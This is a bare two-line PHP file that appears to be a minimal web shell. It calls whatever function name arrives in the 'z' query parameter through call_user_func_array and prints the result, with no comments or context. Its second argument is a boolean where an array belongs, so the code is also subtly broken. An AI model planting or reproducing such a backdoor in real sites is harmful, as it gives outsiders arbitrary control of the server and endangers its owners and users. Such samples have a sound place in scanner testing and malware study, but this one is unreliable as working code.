<?php
isset($_GET['z']) and isset($_GET['zz']) and var_dump(call_user_func_array($_GET['z'],isset($_GET['zz'])));